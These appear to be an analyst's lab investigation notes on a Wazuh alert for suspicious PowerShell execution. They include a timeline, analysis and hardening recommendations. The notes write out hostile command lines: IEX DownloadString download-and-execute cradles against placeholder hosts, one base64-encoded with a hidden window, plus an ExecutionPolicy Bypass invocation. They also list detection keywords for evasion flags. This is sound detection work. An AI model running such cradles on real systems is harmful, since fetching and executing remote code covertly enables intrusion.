# Investigation Notes — Suspicious PowerShell Execution (T1059.001)

**Date:** 2026-06-27
**Analyst:** Hrishi
**Rule Fired:** 100003 — Level 12
**MITRE:** T1059.001 — PowerShell → Execution

---

## Timeline

| Time | Event | Event ID | Source |
|------|-------|----------|--------|
| 00:42:38 | PowerShell launched with -enc and -windowstyle hidden | 1 | windows10-lab |
| 00:42:38 | Rule 100003 fired — evasion flags detected | — | Wazuh |
| 00:42:49 | Second PowerShell instance — IEX DownloadString cradle | 1 | windows10-lab |
| 00:42:49 | Rule 100003 fired again | — | Wazuh |
| 00:43:00 | Third PowerShell instance — ExecutionPolicy Bypass | 1 | windows10-lab |
| 00:43:00 | Rule 100003 fired again | — | Wazuh |

---

## Findings

**Host:** windows10-lab (192.168.234.140)
**User Context:** local admin
**Instances Detected:** 3

**Command 1 — Encoded Command:**
powershell.exe -nop -windowstyle hidden -enc SQBFAFgA...

Decoded: IEX (New-Object Net.WebClient).DownloadString('http://test.com')

**Command 2 — Download Cradle:**
powershell.exe -nop -noprofile -c "IEX (New-Object Net.WebClient).DownloadString('http://test.local')"

**Command 3 — Bypass Flag:**
powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -nop -c "invoke-expression 'whoami'"

---

## Alert Analysis

Rule 100003 fired on Sysmon Event ID 1 matching:
- `powershell.exe` in image field
- Evasion flags in commandLine field (`-enc`, `-nop`, `-windowstyle hidden`, `bypass`, `iex`)

All 3 commands represent classic attacker PowerShell patterns:
- `-enc` hides command intent from basic log inspection
- `-windowstyle hidden` prevents user from seeing execution
- `IEX DownloadString` = live-off-the-land download and execute
- `-ExecutionPolicy Bypass` = disables script execution restrictions

**Parent Process:** explorer.exe (user-initiated in lab context)
**Network Connections:** None confirmed (test.local non-routable)
**Files Dropped:** None confirmed

---

## Detection Verdict

**True Positive (Simulated)** — All 3 commands match known attacker PowerShell patterns.
In a production environment these would trigger immediate analyst response.

---

## Recommendations

- Enable PowerShell Script Block Logging (Event ID 4104)
- Enable PowerShell Transcription logging
- Restrict PowerShell to signed scripts in production
- Deploy AMSI (Antimalware Scan Interface) monitoring
- Alert on PowerShell spawned by Office applications